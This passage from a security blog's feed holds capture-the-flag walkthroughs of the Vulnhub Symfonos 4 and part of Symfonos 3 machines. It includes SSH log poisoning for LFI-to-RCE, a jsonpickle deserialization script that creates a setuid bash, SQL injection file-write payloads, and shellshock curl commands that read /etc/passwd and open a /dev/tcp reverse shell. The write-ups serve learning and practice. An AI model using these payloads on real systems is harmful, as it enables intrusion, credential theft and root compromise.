&lt;p&gt;When accessing the passwd file, we couldn&amp;rsquo;t see any user with home directory in /home looking at the configuration
postexploitation we see that the services are running in docker containers.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos5/symfonos5-14.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;</content>
    </item>
    
    <item>
      <title>Vulnhub: Symfonos 4</title>
      <link>https://blog.ikuamike.io/posts/2021/symfonos4/</link>
      <pubDate>Mon, 15 Feb 2021 00:00:00 +0000</pubDate>
      
      <guid>https://blog.ikuamike.io/posts/2021/symfonos4/</guid>
      <description></description>
      <content>&lt;img src=&#34;https://blog.ikuamike.io/img/symfonos1/symfonos1.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Difficulty&lt;/th&gt;
&lt;th&gt;Release Date&lt;/th&gt;
&lt;th&gt;Author&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Intermediate&lt;/td&gt;
&lt;td&gt;20 Aug 2019&lt;/td&gt;
&lt;td&gt;Zayotic&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h1 id=&#34;summary&#34;&gt;Summary&lt;/h1&gt;
&lt;p&gt;For this box, some directory bruteforce is needed to discover some php files. One of the php files has an lfi
vulnerability but can only be access by authenticating to the other page. The login form can be bypassed and
we exploit the lfi. For that we poison ssh logs for exploitation to rce. For privilege escalation we exploit
a python web app running locally as root using insecure deserialization of the cookie by jsonpickle.&lt;/p&gt;
&lt;h1 id=&#34;reconnaissance&#34;&gt;Reconnaissance&lt;/h1&gt;
&lt;p&gt;Nmap&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;Nmap scan report &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; 192.168.56.105
Host is up &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;0.00033s latency&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;.

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;protocol 2.0&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
| ssh-hostkey:
|   &lt;span style=&#34;color:#ae81ff&#34;&gt;2048&lt;/span&gt; f9:c1:73:95:a4:17:df:f6:ed:5c:8e:8a:c8:05:f9:8f &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;RSA&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
|   &lt;span style=&#34;color:#ae81ff&#34;&gt;256&lt;/span&gt; be:c1:fd:f1:33:64:39:9a:68:35:64:f9:bd:27:ec:01 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;ECDSA&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
|_  &lt;span style=&#34;color:#ae81ff&#34;&gt;256&lt;/span&gt; 66:f7:6a:e8:ed:d5:1d:2d:36:32:64:39:38:4f:9c:8a &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;ED25519&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
80/tcp open  http    Apache httpd 2.4.38 &lt;span style=&#34;color:#f92672&#34;&gt;((&lt;/span&gt;Debian&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt;
|_http-server-header: Apache/2.4.38 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Debian&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
|_http-title: Site doesn&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#39;&lt;/span&gt;t have a title &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;text/html&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;enumeration&#34;&gt;Enumeration&lt;/h1&gt;
&lt;h2 id=&#34;http-80&#34;&gt;HTTP (80)&lt;/h2&gt;
&lt;p&gt;On the browser, the only thing that is served is an image. Therefore we need to bruteforce for directories
and files.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos4/symfonos4-26.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;Performing a bruteforce with ffuf we get a &lt;strong&gt;gods&lt;/strong&gt; directory.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;ffuf -ic -c -u http://192.168.56.105/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e / -fc &lt;span style=&#34;color:#ae81ff&#34;&gt;403&lt;/span&gt; | tee root.ffuf
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos4/symfonos4-2.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;In this directory we only have some files, with nothing useful in them.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos4/symfonos4-1.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;The contents:&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos4/symfonos4-3.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;I decided to use the contents of the files to generate a wordlist for more bruteforce using curl.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos4/symfonos4-4.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;With this new words I performed bruteforce again but adding extensions.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos4/symfonos4-6.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;From this we discover &lt;strong&gt;sea.php&lt;/strong&gt; .&lt;/p&gt;
&lt;p&gt;When we try to visit this file, we get redirected to atlantis.php which has a login form.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos4/symfonos4-7.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;On this form if we submit random creds, then visit sea.php afterwards. We are able to access it. I think this
behaviour is related to the cookies the app sends after trying to login.&lt;/p&gt;
&lt;p&gt;The sea.php has form that loads files based on the god we select. The contents are the log files we discovered
in /gods. Based on this behaviour we can try and exploit lfi to get rce.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos4/symfonos4-10.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;Since the on the url we are passing hades, and it loads content of hades.log. We can assume it appends .log
to our input. This restricts us to only loading log files, but that should be sufficient for lfi to rce.&lt;/p&gt;
&lt;p&gt;After testing a few log files I could only access auth.log which is located in /var/log/auth.log. These are ssh logs.&lt;/p&gt;
&lt;h1 id=&#34;getting-shell-as-www-data&#34;&gt;Getting shell as www-data&lt;/h1&gt;
&lt;p&gt;Let&amp;rsquo;s poison the ssh log by add php code in the username for rce.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos4/symfonos4-12.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;We can pass the command id to test if we were successful.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos4/symfonos4-13.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;In the response we have www-data output. Now we can send our reverse shell payload.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos4/symfonos4-14.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;Shell:&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos4/symfonos4-15.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;In the webroot we can read atlantis.php that had the login form and here we get db creds.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos4/symfonos4-16.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;The discovered password is also the password for the poseidon user.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos4/symfonos4-17.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;h1 id=&#34;privilege-escalation&#34;&gt;Privilege Escalation&lt;/h1&gt;
&lt;p&gt;Performing some manual enumeration locally for privesc paths, I took a look at local listening services. I
discovered port 8080 which I used ssh portforwarding to access from my host.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos4/symfonos4-19.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;A simple web app is running.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos4/symfonos4-18.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;Looking back at running processes, this appears to be a python app which is running as root. Looks like this is our
path to privesc.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos4/symfonos4-21.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;In /opt I found the source code:&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos4/symfonos4-20.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;Based on the use of pickle, we need to exploit deserialization through the cookie.&lt;/p&gt;
&lt;p&gt;I came up with the below script to generate a base64 encoded cookie which when deserialized
will create a setuid binary of bash.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; jsonpickle
&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; base64
&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; os

&lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;RCE&lt;/span&gt;(object):
    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;__reduce__&lt;/span&gt;(self):
        cmd &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;cp /bin/bash /tmp/suidbash;chmod +s /tmp/suidbash&amp;#39;&lt;/span&gt;)
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; os&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;system, (cmd,)

encoded &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; base64&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;b64encode(jsonpickle&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;encode(RCE()))
&lt;span style=&#34;color:#66d9ef&#34;&gt;print&lt;/span&gt;(encoded)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos4/symfonos4-22.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;Setting the cookie and sending the request using burpsuite:&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos4/symfonos4-23.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;We get suidbash&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos4/symfonos4-24.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;And we finally get a root shell:&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos4/symfonos4-25.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;h1 id=&#34;extras&#34;&gt;Extras&lt;/h1&gt;
&lt;h2 id=&#34;checking-the-redirect-on-accessing-the-seaphp&#34;&gt;Checking the redirect on accessing the sea.php.&lt;/h2&gt;
&lt;p&gt;The code on sea.php only checks if the session isset but not what value it is set to. From atlantis.php when you send wrong creds,
the &lt;code&gt;$_SESSION[&#39;logged_in&#39;]&lt;/code&gt; is set to false.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos4/symfonos4-27.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;h2 id=&#34;sql-injection-on-atlantisphp-login-form&#34;&gt;SQL Injection on atlantis.php login form.&lt;/h2&gt;
&lt;p&gt;When you supply username &lt;code&gt;admin&#39; or 1=1-- -&lt;/code&gt; and a random password we get a redirect to sea.php but with
&lt;code&gt;admin&#39; and 1=2-- -&lt;/code&gt; we get a incorrect login.&lt;/p&gt;
&lt;p&gt;This is a blind boolean sql injection. We can intercept the request with burpsuite and save the request to file
and exploit this with sqlmap.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos4/symfonos4-28.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;sqlmap -r atlantis.req --batch --dump --level&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt; --risk&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt; --threads&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;I was able to dump creds but they weren&amp;rsquo;t useful as I couldn&amp;rsquo;t crack the hash.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos4/symfonos4-11.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;Since we can run sql queries, we can try and write to a file and access it using the lfi. During exploiting of this box
I tried this but couldn&amp;rsquo;t figure out why it failed but on revisiting it afterwards I figured out the issue.&lt;/p&gt;
&lt;p&gt;Using this payload in my post request to write to a file using select, we don&amp;rsquo;t get the usual redirect that
signifies that the query was successful.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;username=admin&#39; and 1=2 Union Select 1,&#39;2&#39; INTO OUTFILE &#39;/tmp/test.log&#39;-- -&amp;amp;password=a
&lt;/code&gt;&lt;/pre&gt;
  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos4/symfonos4-29.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;The file is actually written to disk if we check the /tmp folder.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos4/symfonos4-30.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;The reason that we don&amp;rsquo;t get a redirect is that no rows are returned by the query when writing files therefore
the php code returns a false and doesn&amp;rsquo;t redirect to sea.php.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos4/symfonos4-31.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;Now if we try to include the test.log in /tmp using the lfi, it fails. The reason for this is because some services are
configured to have a private tmp folder which isn&amp;rsquo;t the same as the usual /tmp. The below answer I found explains this.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos4/symfonos4-32.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;If you look at the previous screenshot you&amp;rsquo;ll notice the folders beginning with systemd-private and one of those seem to
belong to apache2.&lt;/p&gt;
&lt;p&gt;With this knowledge, we need to use other directories to write files in. Since we are exploiting sql injection for this,
we need folders that the mysql user can write. I discovered /var/lib/mysql and /dev/shm are suitable for this.&lt;/p&gt;
&lt;p&gt;Something else to note is that if a file exists, sql will not overwrite it. Therefore if you need to make changes to
what you&amp;rsquo;re writing you&amp;rsquo;ll need to write to another non-existent file.&lt;/p&gt;
&lt;p&gt;Testing this using /var/lib/mysql the file gets written.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;username=admin&#39; and 1=2 Union Select 1,&#39;test&#39; INTO OUTFILE &#39;/var/lib/mysql/123456.log&#39;-- -&amp;amp;password=a
&lt;/code&gt;&lt;/pre&gt;
  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos4/symfonos4-33.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;Then accessing it using the lfi works this time.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos4/symfonos4-34.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;Something else also to note is that the db user in this case is the mysql root user.&lt;/p&gt;</content>
    </item>
    
    <item>
      <title>Vulnhub: Symfonos 3</title>
      <link>https://blog.ikuamike.io/posts/2021/symfonos3/</link>
      <pubDate>Thu, 11 Feb 2021 00:00:00 +0000</pubDate>
      
      <guid>https://blog.ikuamike.io/posts/2021/symfonos3/</guid>
      <description></description>
      <content>&lt;img src=&#34;https://blog.ikuamike.io/img/symfonos1/symfonos1.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Difficulty&lt;/th&gt;
&lt;th&gt;Release Date&lt;/th&gt;
&lt;th&gt;Author&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Intermediate&lt;/td&gt;
&lt;td&gt;7 Apr 2020&lt;/td&gt;
&lt;td&gt;Zayotic&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h1 id=&#34;summary&#34;&gt;Summary&lt;/h1&gt;
&lt;p&gt;In this box, we need to perform some directory bruteforce then use shellshock vulnerability to get our first shell.
We then sniff local traffic using tcpdump and get credentials for the next user who has permissions to write python2.7 lib
directory. Using those write permissions we hijack a library that is imported in a script that is executed by root in a
cron job. We create a suid bash binary that we use to get a root shell.&lt;/p&gt;
&lt;h1 id=&#34;reconnaissance&#34;&gt;Reconnaissance&lt;/h1&gt;
&lt;p&gt;Nmap&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-nmap&#34; data-lang=&#34;nmap&#34;&gt;Nmap scan report for 192.168.191.130
Host is up (0.00025s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     ProFTPD 1.3.5b
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey:
|   2048 cd:64:72:76:80:51:7b:a8:c7:fd:b2:66:fa:b6:98:0c (RSA)
|   256 74:e5:9a:5a:4c:16:90:ca:d8:f7:c7:78:e7:5a:86:81 (ECDSA)
|_  256 3c:e4:0b:b9:db:bf:01:8a:b7:9c:42:bc:cb:1e:41:6b (ED25519)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Site doesn&#39;t have a title (text/html).
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;enumeration&#34;&gt;Enumeration&lt;/h1&gt;
&lt;h2 id=&#34;http-80&#34;&gt;HTTP (80)&lt;/h2&gt;
&lt;p&gt;Visiting the IP on the browser, all we get is a picture.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos3/symfonos3-11.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;Viewing the source doesn&amp;rsquo;t reveal much.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos3/symfonos3-12.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;Performing a recursive directory bruteforce using ffuf with recursion enabled we get several directories.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;ffuf -ic -c -u http://192.168.191.130/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -recursion | tee ffuf.out.recurse
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos3/symfonos3-3.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;Going to the research endpoint, there&amp;rsquo;s information about the Underworld and Greek mythology.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos3/symfonos3-4.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;Some of the words look similar to the directories we discovered, so let&amp;rsquo;s create a wordlist which maybe helpful later.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;cewl http://192.168.191.130/gate/cerberus/tartarus/research -w words.txt
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The current directories we have discovered don&amp;rsquo;t have much in them. At this point I was stuck a bit, after looking at
some writeups I realized that sometimes valid directories show when you have a trailing slash at the end. So I ran ffuf again
with a trailing slash.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;ffuf -ic -c -u http://192.168.191.130/FUZZ/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt | tee ffuf.rootdir
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos3/symfonos3-5.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;With this idea, cgi-bin directory is discovered. This is a nice directory bruteforce tip I&amp;rsquo;ll use going forward. The presence of
cgi-bin could potentially mean we can have a shellshock vulnerability.&lt;/p&gt;
&lt;p&gt;Running another bruteforce using the wordlist I created earlier didn&amp;rsquo;t work. I then thought to get a lowercase version of the
words and try it.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;cewl --lowercase http://192.168.191.130/gate/cerberus/tartarus/research -w words2.txt

ffuf -ic -c -u http://192.168.191.130/cgi-bin/FUZZ -w words2.txt
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos3/symfonos3-13.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;With the lowercase wordlist, we get underworld.&lt;/p&gt;
&lt;p&gt;To verify the shellshock vulnerability, we can send this request.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;curl -A &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;() { :; }; echo; echo; /bin/bash -c &amp;#39;cat /etc/passwd&amp;#39;&amp;#34;&lt;/span&gt; http://192.168.191.130/cgi-bin/underworld
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos3/symfonos3-6.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;h1 id=&#34;shell-as-cerberus&#34;&gt;Shell as cerberus&lt;/h1&gt;
&lt;p&gt;After verifying this vulnerability, we can get a reverse shell.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;curl -A &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;() { :; }; echo; echo; /bin/bash -c &amp;#39;/bin/bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.191.1/9000 0&amp;gt;&amp;amp;1 &amp;amp;&amp;#39;&amp;#34;&lt;/span&gt; http://192.168.191.130/cgi-bin/underworld
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos3/symfonos3-7.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;On running id we notice that cerberus is part of pcap group. To figure out what is unique about this group I used the find
command.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;find / -group pcap -ls 2&amp;gt;/dev/null
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos3/symfonos3-8.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;This reveals we can run tcpdump, therefore we can sniff network traffic.&lt;/p&gt;
&lt;p&gt;Before sniffing traffic, I used &lt;a href=&#34;https://github.com/DominicBreuker/pspy&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;pspy&lt;/a&gt;

 to check for cron jobs and other commands being executed.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos3/symfonos3-9.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;With this I was able to pick up a cronjob that runs as root. Since ftpclient.py is being executed, I&amp;rsquo;ll sniff ftp
traffic which isn&amp;rsquo;t typically encrypted.&lt;/p&gt;
